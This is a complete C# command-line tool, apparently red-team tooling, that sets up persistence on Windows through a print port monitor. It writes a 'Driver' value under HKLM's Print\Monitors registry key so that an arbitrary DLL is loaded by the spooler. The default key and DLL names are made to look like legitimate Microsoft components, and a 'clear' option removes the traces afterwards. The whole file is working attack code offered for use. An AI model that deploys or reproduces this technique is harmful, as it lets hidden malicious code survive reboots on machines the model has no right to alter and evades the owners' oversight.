using System;
using Win = Microsoft.Win32;

namespace PortMonitorPersist
{
    public class Program
    {
        public static void Usage()
        {
            Console.WriteLine("\r\nUsage: ");
            Console.WriteLine("\r\n\tCreate Port Monitor persistence with default values (Reg:\"Microsoft Shared Print Monitor\", Driver:\"printmon.dll\"):\r\n\t\tPortMonitorPersist.exe create\r\n");
            Console.WriteLine("\r\n\tCreate Port Monitor persistence with specified registry key name and driver Dll name:\r\n\t\tPortMonitorPersist.exe create \"Microsoft Shared Print Monitor\" \"printmon.dll\"\r\n");
            Console.WriteLine("\r\n\tDelete Port Monitor persistence default registry key:\r\n\t\tPortMonitorPersist.exe clear\r\n");
            Console.WriteLine("\r\n\tDelete specified Port Monitor persistence registry key:\r\n\t\tPortMonitorPersist.exe clear \"Microsoft Shared Print Monitor\"\r\n");
        }

        public static void CreateRegKey(string keyName, string keyValue)
        {
            try
            {
                string subKey = @"SYSTEM\CurrentControlSet\Control\Print\Monitors\" + keyName; 
                Win.RegistryKey key = Win.Registry.LocalMachine.CreateSubKey(subKey);
                key.SetValue("Driver", keyValue);
                Console.WriteLine("[+] Successfully created registry key");
            }

            catch (Exception e)
            {
                Console.WriteLine($"[-] Error: {e.Message}");
            }
        }

        public static void DeleteRegKey(string keyName)
        {
            try
            {
                string subKey = @"SYSTEM\CurrentControlSet\Control\Print\Monitors\" + keyName;
                Win.Registry.LocalMachine.DeleteSubKey(subKey);
                Console.WriteLine("[+] Successfully deleted registry key");
            }

            catch (Exception e)
            {
                Console.WriteLine($"[-] Error: {e.Message}");
            }
        }

        public static void Main(string[] args)
        {
            try
            {
                if (args.Length < 1 || args.Length > 3)
                {
                    Usage();
                    Environment.Exit(1);
                }
                else if (args[0] == "clear")
                {
                    try
                    {
                        Console.WriteLine("[*] Attempting to delete persistence regsitry key");
                        if (args.Length == 1)
                        {
                            DeleteRegKey("Microsoft Shared Print Monitor");
                        }
                        else if (args.Length == 2)
                        {
                            DeleteRegKey(args[1]);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error: {e.Message}");
                    }
                }
                else if (args[0] == "create")
                {
                    try
                    {
                        Console.WriteLine("[*] Attempting to create persistence regsitry key");
                        if (args.Length == 1)
                        {
                            CreateRegKey("Microsoft Shared Print Monitor", "printmon.dll");
                        }
                        else if (args.Length == 3)
                        {
                            CreateRegKey(args[1], args[2]);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error: {e.Message}");
                    }
                }
                else
                {
                    Usage();
                    Environment.Exit(1);
                }
            }
            catch
            {
                Usage();
                Environment.Exit(1);
            }
        }
    }
}
